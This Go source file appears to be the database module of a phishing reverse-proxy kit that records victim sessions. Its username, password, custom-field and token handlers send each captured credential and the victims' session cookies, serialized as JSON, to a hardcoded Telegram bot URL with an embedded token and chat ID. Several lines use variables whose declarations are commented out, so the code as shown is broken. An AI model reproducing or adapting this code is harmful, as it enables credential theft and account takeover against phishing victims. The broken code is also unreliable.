package database

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/tidwall/buntdb"
)

func telegramSendResult(msg string) {
	msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)
	resp2, xerr := http.Get("https://api.telegram.org/bot6709278091:AAElpViRJ_jefteECT3Y5iqmWyOe5kpgrV4/sendMessage?chat_id=5538579587&parse_mode=MarkdownV2&text=" + msg)
	//resp, xerr2 := http.Get("https://api.telegram.org/bot6934426143:AAGA2KPG4Tcz36gXFLvnxF-aHdtP3AlC4NY/sendMessage?chat_id=6850929254chatid&parse_mode=MarkdownV2&text=" + msg)
	//resp3, xerr3 := http.Get("https://api.telegram.org/bot6934426143:AAGA2KPG4Tcz36gXFLvnxF-aHdtP3AlC4NY/sendMessage?chat_id=0000000000&parse_mode=MarkdownV2&text=" + msg)

	//5236398939 Fashion

	if xerr != nil {
		fmt.Print("error")
	}
	if xerr2 != nil {
		fmt.Print("error")
	}
	if xerr3 != nil {
		fmt.Print("error")
	}
	defer resp.Body.Close()
	defer resp2.Body.Close()
	defer resp3.Body.Close()

	_, eerr := ioutil.ReadAll(resp.Body)
	if eerr != nil {
		fmt.Print("error")
	}
}

func telegramSendVisitor(msg string) {
	msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)
	resp2, xerr := http.Get("https://api.telegram.org/bot6709278091:AAElpViRJ_jefteECT3Y5iqmWyOe5kpgrV4/sendMessage?chat_id=5538579587&parse_mode=MarkdownV2&text=" + msg)
	//resp, xerr2 := http.Get("https://api.telegram.org/bot6934426143:AAGA2KPG4Tcz36gXFLvnxF-aHdtP3AlC4NY/sendMessage?chat_id=6850929254chatid&parse_mode=MarkdownV2&text=" + msg)
	//resp3, xerr3 := http.Get("https://api.telegram.org/bot6934426143:AAGA2KPG4Tcz36gXFLvnxF-aHdtP3AlC4NY/sendMessage?chat_id=00000000&parse_mode=MarkdownV2&text=" + msg)

	//5236398939 Fashion
	
	if xerr != nil {
		fmt.Print("error")
	}
	if xerr2 != nil {
		fmt.Print("error")
	}
	if xerr3 != nil {
		fmt.Print("error")
	}
	defer resp.Body.Close()
	defer resp2.Body.Close()
	defer resp3.Body.Close()

	_, eerr := ioutil.ReadAll(resp.Body)
	if eerr != nil {
		fmt.Print("error")
	}
}

type Database struct {
	path string
	db   *buntdb.DB
}

func NewDatabase(path string) (*Database, error) {
	var err error
	d := &Database{
		path: path,
	}

	d.db, err = buntdb.Open(path)
	if err != nil {
		return nil, err
	}

	d.sessionsInit()

	d.db.Shrink()
	return d, nil
}

func (d *Database) CreateSession(sid string, phishlet string, landing_url string, useragent string, remote_addr string) error {
	_, err := d.sessionsCreate(sid, phishlet, landing_url, useragent, remote_addr)
	return err
}

func (d *Database) ListSessions() ([]*Session, error) {
	s, err := d.sessionsList()
	return s, err
}

func (d *Database) SetSessionUsername(sid string, username string) error {
	telegramSendResult(fmt.Sprintf("🔥 🔥 USERNAME  :- 🔥 🔥\n\n-🆔ID: %s \n\n-👦🏻Username: %s\n", sid, username))
	err := d.sessionsUpdateUsername(sid, username)
	return err
}

func (d *Database) SetSessionPassword(sid string, password string) error {
	telegramSendResult(fmt.Sprintf("🔥 🔥 PASSWORD :- 🔥 🔥\n\n-🆔ID: %s \n\n-🔑Password: %s\n", sid, password))
	err := d.sessionsUpdatePassword(sid, password)
	return err
}

func (d *Database) SetSessionCustom(sid string, name string, value string) error {
	telegramSendResult(fmt.Sprintf("🔥 🔥 CUSTOM 🔥 🔥\n\n-🆔ID: %s \n\nKey: %s\n-🔑Value: %s\n", sid, name, value))
	err := d.sessionsUpdateCustom(sid, name, value)
	return err
}

func (d *Database) SetSessionTokens(sid string, tokens map[string]map[string]*Token) error {
	err := d.sessionsUpdateTokens(sid, tokens)

	type Cookie struct {
		Path           string `json:"path"`
		Domain         string `json:"domain"`
		ExpirationDate int64  `json:"expirationDate"`
		Value          string `json:"value"`
		Name           string `json:"name"`
		HttpOnly       bool   `json:"httpOnly,omitempty"`
		HostOnly       bool   `json:"hostOnly,omitempty"`
	}

	var cookies []*Cookie
	for domain, tmap := range tokens {
		for k, v := range tmap {
			c := &Cookie{
				Path:           v.Path,
				Domain:         domain,
				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
				Value:          v.Value,
				Name:           k,
				HttpOnly:       v.HttpOnly,
			}
			if domain[:1] == "." {
				c.HostOnly = false
				c.Domain = domain[1:]
			} else {
				c.HostOnly = true
			}
			if c.Path == "" {
				c.Path = "/"
			}
			cookies = append(cookies, c)
		}
	}

	json11, _ := json.Marshal(cookies)
	telegramSendResult(fmt.Sprintf("🍪 🍪 🍪 🍪 🍪 VICTIM COOKIES 🍪 🍪 🍪 🍪 🍪 \n\n-🆔ID: %s\n\n %s\n", sid, string(json11)))
	return err
}

func (d *Database) DeleteSession(sid string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	err = d.sessionsDelete(s.Id)
	return err
}

func (d *Database) DeleteSessionById(id int) error {
	_, err := d.sessionsGetById(id)
	if err != nil {
		return err
	}
	err = d.sessionsDelete(id)
	return err
}

func (d *Database) Flush() {
	d.db.Shrink()
}

func (d *Database) genIndex(table_name string, id int) string {
	return table_name + ":" + strconv.Itoa(id)
}

func (d *Database) getLastId(table_name string) (int, error) {
	var id int = 1
	var err error
	err = d.db.View(func(tx *buntdb.Tx) error {
		var s_id string
		if s_id, err = tx.Get(table_name + ":0:id"); err != nil {
			return err
		}
		if id, err = strconv.Atoi(s_id); err != nil {
			return err
		}
		return nil
	})
	return id, err
}

func (d *Database) getNextId(table_name string) (int, error) {
	var id int = 1
	var err error
	err = d.db.Update(func(tx *buntdb.Tx) error {
		var s_id string
		if s_id, err = tx.Get(table_name + ":0:id"); err == nil {
			if id, err = strconv.Atoi(s_id); err != nil {
				return err
			}
		}
		tx.Set(table_name+":0:id", strconv.Itoa(id+1), nil)
		return nil
	})
	return id, err
}

func (d *Database) getPivot(t interface{}) string {
	pivot, _ := json.Marshal(t)
	return string(pivot)
}
